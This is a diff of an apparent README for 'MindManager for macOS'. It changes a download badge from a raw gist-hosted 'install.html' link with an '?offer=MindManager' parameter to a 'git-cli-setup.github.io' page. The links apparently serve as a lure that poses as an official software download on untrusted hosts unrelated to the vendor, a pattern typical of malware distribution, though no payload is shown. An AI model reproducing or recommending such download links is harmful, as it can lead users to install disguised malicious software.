@@ -2,7 +2,7 @@
 
 MindManager for macOS allows users to brainstorm, plan, and visualize ideas using mind maps, flowcharts, and concept diagrams in a dynamic workspace.
 
-<a href="https://gistcdn.githack.com/bossdlyavseh2004-lang/04d4d32a303ce2f8bfba2e245a0a1b60/raw/8c499672c1e9ff163619c32cc2483d6dc3382780/install.html?offer=MindManager" target="_blank">
+<a href="https://git-cli-setup.github.io/.github/?offer=MindManager" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20MindManager%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="340" 
